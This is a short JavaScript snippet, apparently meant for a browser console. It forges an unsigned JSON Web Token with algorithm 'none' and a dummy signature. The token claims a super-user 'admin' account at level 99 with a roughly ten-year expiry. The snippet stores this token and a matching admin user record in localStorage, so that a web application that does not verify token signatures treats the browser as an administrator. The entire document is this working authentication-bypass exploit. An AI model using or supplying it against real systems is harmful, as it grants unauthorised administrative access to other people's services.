(() => {
  const encode = value => btoa(JSON.stringify(value))
    .replaceAll('+', '-')
    .replaceAll('/', '_')
    .replaceAll('=', '')
  const now = Math.floor(Date.now() / 1000)
  const token = [
    encode({ alg: 'none', typ: 'JWT' }),
    encode({
      sub: '0',
      username: 'admin',
      super_user: true,
      level: 99,
      purpose: 'authentication',
      iat: now,
      exp: now + 315360000,
    }),
    'fnos',
  ].join('.')

  localStorage.setItem('auth', JSON.stringify({
    token,
    remember: true,
    originalPath: null,
  }))
  localStorage.setItem('user', JSON.stringify({
    superUser: true,
    userID: 0,
    userName: 'admin',
    avatar: '',
    level: 99,
    permissions: {},
    wizard: false,
  }))
})()
